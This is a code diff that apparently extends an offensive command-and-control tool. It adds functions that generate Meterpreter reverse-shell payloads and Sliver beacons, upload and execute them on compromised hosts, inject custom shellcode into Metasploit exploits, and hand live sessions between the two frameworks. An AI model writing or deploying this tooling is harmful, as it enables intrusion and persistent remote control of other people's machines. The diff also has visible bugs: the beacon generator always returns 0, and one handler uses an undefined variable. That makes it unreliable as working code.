@@ -15,6 +15,11 @@ MSF_PORT = 1337
 MSF_PASSWORD = "memes"
 RESOURCE_SCRIPT = "/usr/src/metasploit-framework/docker/msfconsole.rc"
 
+# Alex New
+SLIVER_HOST = "10.1.1.2"
+SLIVER_PORT = 55552
+# Alex End
+
 server = None
 msfInstance = None
 sliver_server = None
@@ -93,6 +98,19 @@ def run_meterpreter_exploit(target_ip):
     job_id = exploit.execute()
     return f"{GREEN}[+] Meterpreter exploit launched with job ID {job_id}{RESET}"
 
+# Alex New
+def generate_meterpreter_payload():
+    output_file = "/workspace/enderCLI/meterpreter_payload"
+    cmd = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={MSF_HOST} LPORT=4444 -f elf -o {output_file}"
+    try:
+        subprocess.run(cmd, shell=True, check=True)
+        print(f"{GREEN}[+] Generated Meterpreter payload at {output_file}{RESET}")
+        return output_file
+    except Exception as e:
+        print(f"{RED}[!] Failed to generate Meterpreter payload: {e}{RESET}")
+        return None
+# Alex End
+
 def monitor_meterpreter_sessions():
     """Monitor for new Meterpreter sessions."""
     if msfInstance is None:
@@ -113,6 +131,20 @@ def interact_meterpreter(session_id, command):
     session = msfInstance.sessions.session(session_id)
     if not session:
         return f"{RED}[!] Invalid session ID: {session_id}{RESET}"
+
+    # Session passing (msf > sliver)
+    # Alex New
+    if command == "transfer-sliver":
+        beacon_path = generate_beacon("5", "10", SLIVER_HOST, "linux", "amd64", "sliver_beacon", format="bin")
+        if not beacon_path:
+            return f"{RED}[-] Failed to generate Sliver beacon for handoff.{RESET}"
+        session.write(f"upload {beacon_path} /tmp/sliver_beacon")
+        session.run_with_output("shell chmod +x /tmp/sliver_beacon && /tmp/sliver_beacon &")
+        return f"{GREEN}[+] Handed off session {session_id} to Sliver{RESET}"
+    #else:
+    #    response = session.run_with_output(command)
+    #    return f"{GREEN}[+] Meterpreter Response:\n{response}{RESET}"
+    # Alex End
 
     response = session.run_with_output(command)
     return f"{GREEN}[+] Meterpreter Response:\n{response}{RESET}"
@@ -223,11 +255,36 @@ def parse_param_value(opt_data, user_input):
     # Otherwise, treat as string
     return user_input
 
-def run_msf_exploit(mtype, mname, user_params):
+def run_msf_exploit(mtype, mname, user_params, c2="metasploit"):
     """Run the selected exploit with parameters, no extra prompting."""
+    
+    # Alex New
+    if msfInstance is None:
+        return f"{RED}[-] Not connected to Metasploit.{RESET}"
+    # Alex End
+    
     exploit = msfInstance.modules.use(mtype, mname)
     if not exploit:
         return f"{RED}[!] Could not load {mtype} module: {mname}{RESET}"
+
+    # Alex New
+    # BYOS: bring your own stager (msf > sliver)
+    if c2 == "sliver":
+        # Generate Sliver shellcode
+        beacon_path = generate_beacon("5", "0", SLIVER_HOST, "linux", "amd64", "sliver_beacon", format="shellcode")
+        if not beacon_path:
+            return f"{RED}[-] Failed to generate Sliver shellcode.{RESET}"
+        with open(beacon_path, "rb") as f:
+            shellcode = f.read()
+        exploit["PAYLOAD"] = "generic/custom"
+        exploit["CUSTOM_PAYLOAD"] = shellcode
+        exploit["LHOST"] = SLIVER_HOST
+        exploit["LPORT"] = SLIVER_PORT
+    else:
+        exploit["PAYLOAD"] = "linux/x64/meterpreter/reverse_tcp" # meterpreter for linux
+        exploit["LHOST"] = MSF_HOST
+        exploit["LPORT"] = 4444 # msf server port? check client.py
+    # Alex End
 
     # Only set the user_params we collected in handle_message
     for param_key, param_value in user_params.items():
@@ -237,6 +294,84 @@ def run_msf_exploit(mtype, mname, user_params):
     result = exploit.execute()
     print(f"{BLUE}Exploit Result: {result}{RESET}")
     return result
+
+
+# Alex New
+def interact_sliver(session_id, command):
+    """Interact with a Sliver session, including handoff to Metasploit."""
+    global sliver_client
+    if sliver_client is None:
+        return f"{RED}[-] Sliver client not running.{RESET}"
+
+    try:
+        # Check if session exists by listing sessions
+        sliver_client.sendline("sessions")
+        time.sleep(2)
+        output = sliver_client.read_nonblocking(size=4096, timeout=2)
+        if session_id not in output:
+            return f"{RED}[!] Invalid Sliver session ID: {session_id}{RESET}"
+
+        if command == "handoff_to_metasploit":
+            # Generate Meterpreter payload
+            payload_path = generate_meterpreter_payload()
+            if not payload_path:
+                return f"{RED}[-] Failed to generate Meterpreter payload.{RESET}"
+
+            # Use the session
+            sliver_client.sendline(f"use {session_id}")
+            sliver_client.expect(r">", timeout=10)
+
+            # Upload payload
+            upload_cmd = f"upload {payload_path} /workspace/enderCLI/meterpreter_payload"
+            sliver_client.sendline(upload_cmd)
+            time.sleep(5)
+            output = sliver_client.read_nonblocking(size=4096, timeout=5)
+            if "Uploaded" not in output:
+                return f"{RED}[!] Failed to upload Meterpreter payload: {output}{RESET}"
+
+            # Execute payload
+            execute_cmd = "execute -f /workspace/enderCLI/meterpreter_payload"
+            sliver_client.sendline(execute_cmd)
+            time.sleep(5)
+            output = sliver_client.read_nonblocking(size=4096, timeout=5)
+            print(f"{GREEN}[+] Execute output: {output}{RESET}")
+
+            # Return to main prompt
+            sliver_client.sendline("sessions")
+            return f"{GREEN}[+] Handed off Sliver session {session_id} to Metasploit{RESET}"
+        else:
+            sliver_client.sendline(f"use {session_id}")
+            sliver_client.expect(r">", timeout=10)
+            sliver_client.sendline(command)
+            time.sleep(2)
+            response = sliver_client.read_nonblocking(size=4096, timeout=2)
+            return f"{GREEN}[+] Sliver Response:\n{response}{RESET}"
+
+    except Exception as e:
+        return f"{RED}[!] Error interacting with Sliver session: {e}{RESET}"
+# Alex End
+
+# Alex New
+def generate_beacon(seconds, jitter, http, os, arch, beacon_name, format="bin"):
+    output_file = f"/workspace/enderCLI/{beacon_name}"
+    if format == "shellcode":
+        beacon_creation_command = f"generate beacon --seconds {seconds} --jitter {jitter} --http {http} --os {os} --arch {arch} --format shellcode --save {output_file}"
+    else:
+        beacon_creation_command = f"generate beacon --seconds {seconds} --jitter {jitter} --http {http} --os {os} --arch {arch} --save {output_file}"
+    
+    print(f"{GREEN}[+] Sending Beacon Creation Command: {beacon_creation_command}{RESET}")
+    sliver_client.sendline(beacon_creation_command)
+    output = ""
+    timeout = 30
+    start_time = time.time()
+    while time.time() - start_time < timeout:
+        chunk = sliver_client.read_nonblocking(size=1024, timeout=5)
+        output += chunk
+        print(chunk)
+        if 'Implant saved to' in chunk:
+            break
+    return 0
+# Alex End
 
 #####################
 # Validate Module 
@@ -329,6 +464,11 @@ def handle_message(data, client_address):
         else:
             module_type = options[1]
             module_name = options[2]
+            
+            # Alex New
+            c2_type = options[3] if len(options) > 3 else "metasploit"
+            # Alex End
+            
             valid_ok, err_msg = validate_module_type(module_type, module_name)
 
             if msfInstance is None:
@@ -372,6 +512,10 @@ def handle_message(data, client_address):
                     client_state['user_params'] = {}
                     client_state['module_type'] = module_type
                     client_state['module_name'] = module_name
+                    
+                    # Alex New
+                    client_state['c2'] = c2_type
+                    # Alex End
 
                     # 3. If there are no prompts, just execute immediately
                     if not module_options:
@@ -458,6 +602,25 @@ def handle_message(data, client_address):
                 response = f"{GREEN}{output}{RESET}"
             except KeyError:
                 response = f"{RED}Session ID {session_id} does not exist.{RESET}"
+    
+    # Alex New
+    elif command == "get-sliver-sessions":
+        if sliver_client is None or not sliver_client.isalive():
+            response = f"{RED}[-] Sliver client not running.{RESET}"
+        else:
+            sliver_client.sendline("sessions")
+            time.sleep(2)
+            output = sliver_client.read_nonblocking(size=4096, timeout=2)
+            response = f"{GREEN}[+] Sliver Sessions:\n{output}{RESET}"
+            
+    elif command.startswith("sliver"):
+        sections = data.split(maxsplit=2)
+        if len(sections) < 3:
+            response = f"{RED}[!] Usage: sliver <session_id> <command>{RESET}"
+        else:
+            session_id, sliver_command = parts[1], parts[2]
+            response = interact_sliver(session_id, sliver_command)
+    # Alex End
     
     elif command == "jobs":
         if msfInstance is None:
